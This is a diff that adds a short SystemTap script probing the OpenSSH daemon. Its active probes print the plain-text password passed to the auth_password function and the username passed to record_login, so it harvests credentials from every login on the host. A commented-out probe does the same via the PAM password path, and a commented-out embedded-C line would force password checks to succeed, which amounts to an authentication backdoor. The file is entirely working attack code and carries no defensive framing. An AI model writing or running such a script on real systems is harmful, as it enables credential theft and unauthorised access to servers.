@@ -1,0 +1,13 @@
+/*
+probe process("/usr/sbin/sshd").function("sshpam_auth_passwd"){
+  printf("authctxt: %lx ,password:%s\n", pointer_arg(1), user_string(pointer_arg(2)))
+}
+*/
+probe process("/usr/sbin/sshd").function("auth_password").return{
+    printf("password:%s\n", @entry(user_string(pointer_arg(2))))
+    #%{c->uregs->ax = 1%}
+}
+probe process("/usr/sbin/sshd").function("record_login"){
+    printf("username:%s\n", user_string(pointer_arg(3)))
+}
+
